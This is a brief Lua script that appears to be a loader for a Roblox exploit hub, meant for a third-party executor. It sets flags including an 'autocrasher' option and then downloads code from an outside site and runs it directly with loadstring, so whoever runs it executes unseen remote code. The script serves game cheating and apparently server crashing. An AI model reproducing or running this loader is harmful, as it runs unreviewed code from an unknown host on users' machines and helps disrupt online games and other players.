```lua
_G.gui = true
_G.autocrasher = false

local r = request or (http or syn).request or http_request;loadstring(r({Url="https://api.darchub.site/"}).Body)()
```